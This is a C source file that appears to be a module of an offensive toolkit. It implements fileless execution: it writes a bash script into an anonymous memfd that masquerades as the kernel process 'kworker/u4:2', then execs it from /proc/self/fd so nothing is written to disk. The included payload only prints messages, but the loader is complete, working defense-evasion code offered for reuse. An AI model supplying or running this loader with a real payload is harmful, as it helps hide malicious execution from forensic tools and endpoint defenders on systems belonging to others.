/**
 * SEFER_HA_RAZIM | MODULE: DAAT_MEMFD (FILELESS DROPPER)
 * TACTIC: DEFENSE EVASION (EXECUTION FROM RAM)
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>

int main() {
    printf("\033[38;5;196m[*] INVOCANDO O FANTASMA. ALOCANDO MEMÓRIA ANÔNIMA...\033[0m\n");

    // Cria um arquivo invisível apenas na memória RAM (Disfarçado como processo do Kernel)
    // NOTA: Sem MFD_CLOEXEC para que o FD sobreviva ao exec()
    int fd = memfd_create("kworker/u4:2", 0);
    if (fd == -1) {
        perror("memfd_create");
        return 1;
    }

    // Payload de Script Oculto (O Golem)
    const char *payload = "#!/bin/bash\n"
                          "echo -e '\\033[1;33m[+] FANTASMA EXECUTADO DIRETAMENTE DA RAM. NENHUM RASTRO NO DISCO.\\033[0m'\n"
                          "ps -p $$ -o comm=\n";
    
    write(fd, payload, strlen(payload));

    // Executa o arquivo da RAM referenciando o próprio descritor de arquivo do processo
    char path[256];
    sprintf(path, "/proc/self/fd/%d", fd);
    
    printf("\033[38;5;118m[+] EXECUTANDO ARTEFATO INVISÍVEL EM: %s\033[0m\n", path);
    
    // Transmutação: O processo atual se torna o script rodando na RAM
    // O FD é herdado porque não usamos MFD_CLOEXEC
    execl("/bin/bash", "bash", path, NULL);
    
    return 0;
}
